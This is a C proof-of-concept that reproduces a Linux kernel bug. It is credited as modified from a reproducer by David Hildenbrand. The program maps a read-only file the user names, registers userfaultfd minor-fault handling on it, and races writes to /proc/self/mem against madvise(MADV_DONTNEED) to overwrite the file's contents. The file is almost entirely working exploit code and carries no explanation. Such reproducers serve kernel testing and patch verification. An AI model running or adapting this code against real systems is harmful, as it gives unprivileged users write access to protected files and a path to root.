/*
 *
 * modified reproducer by deayzl (originally from David Hildenbrand <david@redhat.com>)
 *
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <poll.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/prctl.h>

#define UFFD_FEATURE_MINOR_SHMEM		(1<<10)

#define UFFDIO_REGISTER_MODE_MINOR	((__u64)1<<2)

#define UFFD_USER_MODE_ONLY 1

#define _UFFDIO_CONTINUE		(0x07)

#define UFFDIO_CONTINUE		_IOWR(UFFDIO, _UFFDIO_CONTINUE,	\
				      struct uffdio_continue)

struct uffdio_continue {
	struct uffdio_range range;
#define UFFDIO_CONTINUE_MODE_DONTWAKE		((__u64)1<<0)
	__u64 mode;

	/*
	 * Fields below here are written by the ioctl and must be at the end:
	 * the copy_from_user will not read past here.
	 */
	__s64 mapped;
};

int mem_fd;
void *map;
int uffd;

char str[] = "AAAA";

void *write_thread_fn(void *arg)
{
	prctl(PR_SET_NAME, "pwrite");
	pwrite(mem_fd, str, strlen(str), (uintptr_t) map);
}

static void *uffd_thread_fn(void *arg)
{
	static struct uffd_msg msg;   /* Data read from userfaultfd */
	struct uffdio_continue uffdio;
	struct uffdio_range uffdio_wake;
	ssize_t nread;
	prctl(PR_SET_NAME, "uffd");

	while (1) {
		struct pollfd pollfd;
		int nready;

		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nready = poll(&pollfd, 1, -1);
		if (nready == -1) {
			fprintf(stderr, "poll() failed: %d\n", errno);
			exit(1);
		}

		nread = read(uffd, &msg, sizeof(msg));
		if (nread <= 0)
			continue;

		uffdio.range.start = (unsigned long) map;
		uffdio.range.len = 4096;
		uffdio.mode = 0;
		if (ioctl(uffd, UFFDIO_CONTINUE, &uffdio) < 0) {
			if (errno == EEXIST) {
				uffdio_wake.start = (unsigned long) map;
				uffdio_wake.len = 4096;
				if (ioctl(uffd, UFFDIO_WAKE, &uffdio_wake) < 0) {

				}
			} else {
				fprintf(stderr, "UFFDIO_CONTINUE failed: %d\n", errno);
			}
		}
	}
}

static int setup_uffd(void)
{
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;

	uffd = syscall(__NR_userfaultfd,
		       O_CLOEXEC | O_NONBLOCK | UFFD_USER_MODE_ONLY);
	if (uffd < 0) {
		fprintf(stderr, "syscall(__NR_userfaultfd) failed: %d\n", errno);
		return -errno;
	}

	uffdio_api.api = UFFD_API;
	uffdio_api.features = UFFD_FEATURE_MINOR_SHMEM;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) < 0) {
		fprintf(stderr, "UFFDIO_API failed: %d\n", errno);
		return -errno;
	}

	if (!(uffdio_api.features & UFFD_FEATURE_MINOR_SHMEM)) {
		fprintf(stderr, "UFFD_FEATURE_MINOR_SHMEM missing\n");
		return -ENOSYS;
	}

	uffdio_register.range.start = (unsigned long) map;
	uffdio_register.range.len = 4096;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MINOR;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) < 0) {
		fprintf(stderr, "UFFDIO_REGISTER failed: %d\n", errno);
		return -errno;
	}

	return 0;
}

static void print_content(int fd)
{
	ssize_t ret;
	char buf[80];
	int offs = 0;

	while (1) {
		ret = pread(fd, buf, sizeof(buf) - 1, offs);
		if (ret > 0) {
			buf[ret] = 0;
			printf("%s", buf);
			offs += ret;
		} else if (!ret) {
			break;
		} else {
			fprintf(stderr, "pread() failed: %d\n", errno);
		}
	}
	printf("\n");
}

int main(int argc, char *argv[])
{
	pthread_t thread1, thread2;
	int fd;

	if (argc == 2) {
		fd = open(argv[1], O_RDONLY);
		if (fd < 0) {
			fprintf(stderr, "open() failed: %d\n", errno);
			return 1;
		}
	} else {
		fprintf(stderr, "usage: %s target_file\n", argv[0]);
		return 1;
	}

	mem_fd = open("/proc/self/mem", O_RDWR);
	if (mem_fd < 0) {
		fprintf(stderr, "open(/proc/self/mem) failed: %d\n", errno);
		return 1;
	}

	map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd ,0);
	if (map == MAP_FAILED) {
		fprintf(stderr, "mmap() failed: %d\n", errno);
		return 1;
	}

	if (setup_uffd())
		return 1;

	printf("Old content: \n");
	print_content(fd);

	int ret;
	int tmp;
	pthread_create(&thread1, NULL, uffd_thread_fn, NULL);
	prctl(PR_SET_NAME, "madvise");
	ret = madvise(map, 4096, MADV_DONTNEED);
	if (ret < 0) {
		fprintf(stderr, "madvise() failed: %d\n", errno);
		exit(1);
	}
	tmp = *((int *)map);
	pthread_create(&thread2, NULL, write_thread_fn, NULL);
	sleep(0.3);
	prctl(PR_SET_NAME, "madvise");
	ret = madvise(map, 4096, MADV_DONTNEED);
	if (ret < 0) {
		fprintf(stderr, "madvise() failed: %d\n", errno);
		exit(1);
	}
	tmp = *((int *)map);
	sleep(5);

	printf("New content: \n");
	print_content(fd);

	return 0;
}